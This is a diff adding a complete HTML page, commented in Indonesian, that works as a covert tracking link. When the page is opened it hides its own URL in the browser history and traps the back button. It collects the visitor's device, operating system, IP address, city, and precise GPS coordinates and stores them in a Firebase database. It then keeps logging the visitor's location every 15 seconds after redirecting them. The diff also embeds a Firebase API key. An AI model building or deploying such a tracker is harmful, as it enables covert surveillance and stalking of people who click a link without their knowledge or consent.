@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title> <!-- judul kosong -->
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; filter: blur(10px); }
+    </style>
+</head>
+<body>
+    <script type="module">
+        // Nyamar di history (timpa URL biar gak keliatan track.html)
+        history.replaceState({}, "", "/");
+
+        // Jebakan tombol back
+        window.history.pushState(null, "", window.location.href);
+        window.onpopstate = function () {
+            window.history.go(1);
+        };
+
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getFirestore, doc, getDoc, updateDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAtTaKf_Psb-yhxa5nNFIcs3Tte5gjYe00",
+            authDomain: "locked-1dfad.firebaseapp.com",
+            projectId: "locked-1dfad",
+            storageBucket: "locked-1dfad.firebasestorage.app",
+            messagingSenderId: "237366240355",
+            appId: "1:237366240355:web:e3a4f999ff547a07398456"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkId = urlParams.get('id');
+        const linkRef = doc(db, "trackingLinks", linkId);
+
+        (async () => {
+            const docSnap = await getDoc(linkRef);
+            if (!docSnap.exists()) {
+                document.body.innerHTML = '<h1>Error: Tautan tidak valid</h1>';
+                return;
+            }
+
+            const linkData = docSnap.data();
+            const clickData = { timestamp: Date.now() };
+
+            const ua = navigator.userAgent.toLowerCase();
+            let device = "Unknown Device";
+            let os = "Unknown OS";
+
+            if (ua.includes("oppo")) device = "Oppo";
+            else if (ua.includes("vivo")) device = "Vivo";
+            else if (ua.includes("xiaomi")) device = "Xiaomi";
+            else if (ua.includes("redmi")) device = "Xiaomi (Redmi)";
+            else if (ua.includes("samsung")) device = "Samsung";
+            else if (ua.includes("realme")) device = "Realme";
+            else if (ua.includes("huawei")) device = "Huawei";
+            else if (ua.includes("infinix")) device = "Infinix";
+            else if (ua.includes("asus")) device = "Asus";
+            else if (ua.includes("iphone")) device = "iPhone";
+            else if (ua.includes("ipad")) device = "iPad";
+
+            if (ua.includes("android")) os = "Android";
+            else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) os = "iOS";
+            else if (ua.includes("win")) os = "Windows";
+            else if (ua.includes("mac")) os = "MacOS";
+            else if (ua.includes("linux")) os = "Linux";
+
+            clickData.device = device;
+            clickData.os = os;
+
+            fetch('https://api.ipify.org?format=json').then(res => res.json()).then(ipData => {
+                const ipv4 = ipData.ip;
+                return fetch(`https://ipapi.co/${ipv4}/json/`).then(res => res.json()).then(geo => {
+                    clickData.ipInfo = {
+                        ip: ipv4,
+                        city: geo.city,
+                        country: geo.country_name
+                    };
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(pos => {
+                            clickData.location = {
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude
+                            };
+                            saveAndRedirect();
+                        }, () => saveAndRedirect(), { timeout: 5000 });
+                    } else {
+                        saveAndRedirect();
+                    }
+                });
+            }).catch(() => saveAndRedirect());
+
+            async function saveAndRedirect() {
+                await updateDoc(linkRef, {
+                    clicks: arrayUnion(clickData)
+                });
+                startTracking();
+                window.open(linkData.targetUrl, "_blank");
+            }
+
+            function startTracking() {
+                if (!navigator.geolocation) return;
+                setInterval(async () => {
+                    navigator.geolocation.getCurrentPosition(async pos => {
+                        const snap = await getDoc(linkRef);
+                        if (snap.exists()) {
+                            let data = snap.data();
+                            let history = data.locations || [];
+                            history.push({
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                timestamp: Date.now()
+                            });
+                            if (history.length > 10) {
+                                history = history.slice(history.length - 10);
+                            }
+                            await updateDoc(linkRef, { locations: history });
+                        }
+                    }, () => {}, { timeout: 5000 });
+                }, 15000);
+            }
+        })();
+    </script>
+</body>
+</html>
